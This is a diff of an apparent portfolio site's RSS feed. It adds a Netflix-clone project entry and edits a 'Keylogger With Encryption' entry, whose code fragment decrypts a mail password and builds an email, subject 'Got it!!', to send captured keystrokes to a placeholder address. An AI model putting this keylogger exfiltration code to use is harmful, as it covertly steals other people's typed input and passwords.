@@ -12,6 +12,29 @@
     </author>
     
       <item>
+        <title>Netflix Clone</title>
+        <description>
+&lt;p&gt;OBJECTIVE:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Create a Netflix clone web app that integrates a Paypal Payment gateway and authenticate users via Firebase with Redux Architecture.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;CREATED BY: SEAN DAZA
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/seandaza&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;VISIT THE DEPLOY OF THIS APPLICATION HERE:
+&lt;a href=&quot;https://netflix-clone-2022.netlify.app&quot;&gt;https://netflix-clone-2022.netlify.app&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;FOR CODE DETAILS, VISIT MY GITHUB ACOUNT:
+&lt;a href=&quot;https://github.com/seandaza&quot;&gt;https://github.com/seandaza&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Feb 2022 00:00:00 -0500</pubDate>
+        <link>http://localhost:4000//Netflix-Clone</link>
+        <link href="http://localhost:4000/Netflix-Clone"/>
+        <guid isPermaLink="true">http://localhost:4000/Netflix-Clone</guid>
+      </item>
+    
+      <item>
         <title>Keylogger With Encryption</title>
         <description>
 &lt;p&gt;OBJECTIVE:&lt;/p&gt;
@@ -86,11 +109,11 @@
     &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clave&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
     &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MIMEMultipart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;mensaje&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Guarda bien esto!'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;mensaje&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Save this!!'&lt;/span&gt;
 
-    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'From'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'seandaza@gmail.com'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'To'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'seandaza@gmail.com'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Subject'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Te lo he Capturado'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'From'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'youremail@email.com'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'To'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'youremail@email.com'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Subject'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Got it!!'&lt;/span&gt;
 
     &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIMEText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mensaje&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'plain'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 
